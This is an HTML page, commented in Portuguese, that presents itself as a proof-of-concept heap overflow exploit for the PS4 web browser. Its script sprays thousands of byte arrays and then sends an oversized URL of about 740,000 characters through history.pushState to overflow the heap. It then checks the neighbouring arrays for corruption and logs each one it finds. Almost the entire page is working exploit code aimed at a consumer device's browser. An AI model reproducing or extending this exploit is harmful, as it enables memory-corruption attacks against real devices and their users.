<!DOCTYPE html>
<html>
<head>
    <title>PS4 Heap Corruption PoC</title>
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 24px; padding: 20px; margin: 20px; cursor: pointer; 
            width: 90%; border: 2px solid #00ff00; background: #222; color: #fff; font-weight: bold;
        }
        #log { margin-top: 20px; border: 1px solid #555; padding: 15px; color: cyan; text-align: left; height: 300px; overflow-y: scroll;}
        .success { color: #ff00ff; font-weight: bold; font-size: 20px; }
    </style>
</head>
<body>

    <h1>Heap Overflow: Corrupção de Vizinhos</h1>
    <p>Tentando atropelar Arrays JavaScript com 0x01.</p>

    <button onclick="runExploit()">DISPARAR EXPLOIT</button>

    <div id="log">Pronto.</div>

    <script>
        const BASE_OFFSET = 709522;
        const OVERFLOW_SIZE = 32000; // O tamanho que sabemos que funciona
        const SPRAY_COUNT = 15000;   // Quantidade de "vizinhos"
        
        var memoryBanks = [];

        function log(msg) {
            const el = document.getElementById('log');
            el.innerHTML += msg + "<br>";
            el.scrollTop = el.scrollHeight;
        }

        function runExploit() {
            log("1. Alocando " + SPRAY_COUNT + " arrays (Spray)...");

            // FASE 1: SPRAY
            // Criamos milhares de arrays Uint8Array preenchidos com 0x22
            for (let i = 0; i < SPRAY_COUNT; i++) {
                let arr = new Uint8Array(1024); // Arrays de 1KB
                arr.fill(0x22); // Preenche com 0x22 (")
                memoryBanks.push(arr);
            }

            log("2. Disparando Overflow de 32KB com bytes 0x01...");

            setTimeout(() => {
                try {
                    // FASE 2: OVERFLOW
                    let buffer = "A".repeat(BASE_OFFSET);
                    // Adiciona 32.000 bytes de 0x01
                    buffer += "\x01".repeat(OVERFLOW_SIZE);

                    // Dispara
                    history.pushState({}, "pwn", "/" + buffer);

                    // FASE 3: VERIFICAÇÃO
                    log("3. Verificando vítimas...");
                    checkCorruption();

                } catch (e) {
                    log("Erro crítico: " + e.message);
                }
            }, 500);
        }

        function checkCorruption() {
            let corruptedCount = 0;

            for (let i = 0; i < memoryBanks.length; i++) {
                let arr = memoryBanks[i];
                
                // Checa o primeiro byte. Deveria ser 0x22 (34).
                // Se for 0x01 (1), fomos atropelados!
                if (arr[0] !== 0x22) {
                    log("<span class='success'>[SUCESSO] Array #" + i + " CORROMPIDO!</span>");
                    log("Valor esperado: 34 (0x22) | Valor encontrado: " + arr[0]);
                    corruptedCount++;
                    
                    // Mostra os primeiros 10 bytes para confirmar
                    let preview = "";
                    for(let k=0; k<10; k++) preview += arr[k] + " ";
                    log("Dump: " + preview);
                    
                    // Para no primeiro sucesso para não travar a UI
                    if(corruptedCount > 5) break; 
                }
            }

            if (corruptedCount === 0) {
                log("Nenhuma corrupção detectada. O Overflow caiu no vazio ou longe dos arrays.");
                log("Tente aumentar o SPRAY_COUNT ou reiniciar o console.");
            } else {
                document.body.style.backgroundColor = "#220022";
            }
        }
    </script>
</body>
</html>




